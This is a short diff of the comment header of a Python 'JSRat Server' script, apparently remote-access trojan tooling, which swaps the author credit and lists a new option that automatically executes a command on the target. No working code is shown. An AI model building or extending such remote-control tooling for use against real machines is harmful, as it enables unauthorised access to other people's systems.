@@ -1,8 +1,9 @@
 #!/usr/bin/env python
 #
 # JSRat Server
-# By: Hood3dRob1n
+# Edited: JPMonglis
 #
+
 # Added functionality
 # -c option that automatically exeutes a command on the targer
 # Removed the dependency to read the commands to be executed from the stdin
